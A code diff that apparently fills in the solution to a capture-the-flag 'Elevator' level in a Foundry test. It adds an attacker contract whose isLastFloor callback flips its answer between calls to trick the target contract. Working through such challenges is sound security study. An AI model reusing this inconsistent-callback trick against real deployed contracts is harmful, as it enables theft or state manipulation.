@@ -17,5 +17,26 @@ contract ElevatorLevel is SetUpLevelTest {
         elevator = Elevator(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        Building building = new Building();
+        building.takeElevator(address(elevator));
+        vm.stopPrank();
+    }
+}
+
+contract Building {
+    uint256 flip;
+
+    function takeElevator(address _target) public {
+        Elevator(_target).goTo(42);
+    }
+
+    function isLastFloor(uint256) public returns (bool ret) {
+        if (flip % 2 == 0) {
+            ret = false;
+        } else {
+            ret = true;
+        }
+        ++flip;
     }
 }
